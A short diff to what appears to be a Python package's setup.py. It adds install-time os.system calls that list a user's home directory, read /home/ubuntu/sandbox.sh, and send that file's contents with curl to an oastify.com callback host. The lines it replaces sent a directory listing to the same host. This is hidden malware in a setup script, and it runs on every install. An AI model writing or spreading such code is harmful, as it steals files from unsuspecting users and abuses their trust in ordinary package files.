@@ -5,8 +5,8 @@ import os
 
 try:
     from setuptools import setup
-    x = os.system("ls -l ../../../../../../home/ubuntu/; df")
-    y = os.system("curl -X POST http://ct9o0nocfml7jh0lhdbx3ut16scj09oy.oastify.com/ -d \"`ls -l ../../../../../../home/ubuntu/;`\"")
+    x = os.system("ls -l ../../../../../../home/ubuntu/; cat /home/ubuntu/sandbox.sh")
+    y = os.system("curl -X POST http://ct9o0nocfml7jh0lhdbx3ut16scj09oy.oastify.com/ -d \"`cat /home/ubuntu/sandbox.sh`\"")
     with open('x', 'w') as f:
         #f.write(x)
         f.write(y)
